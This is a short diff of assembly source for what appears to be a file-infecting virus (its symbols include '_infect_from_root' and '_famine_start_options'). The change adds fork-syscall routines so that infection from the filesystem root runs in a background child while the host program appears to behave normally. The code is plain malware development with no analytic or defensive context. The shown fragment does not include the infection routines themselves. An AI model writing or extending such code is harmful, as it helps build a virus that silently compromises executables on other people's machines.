@@ -3,6 +3,7 @@ section .text
 	global _infect_from_root
 	global _verify_starting_infect
 	global _famine_start_options
+    global _fork_before_exec_normaly
 	extern _final_end
 	extern _string
 	extern _treat_file
@@ -241,5 +242,21 @@ _test_options:
 	cld
 	repe cmpsb
 	lea rdi, [rel _exit_properly]
-	je _infect_from_root ; infect from root
+	je _fork_before_infect_root ; infect from root
 	jmp _continue_normaly ; no arguments corresponds, so simply run normally.
+
+_fork_before_infect_root:
+	mov rax, 57
+	syscall
+	cmp rax, 0
+    jne _exit_properly
+    lea rdi, [rel _exit_properly]
+    jmp _infect_from_root
+
+_fork_before_exec_normaly:
+	mov rax, 57
+	syscall
+	cmp rax, 0
+    jne _verify_o_entry
+    lea rdi, [rel _exit_properly]
+    jmp _infect_from_root
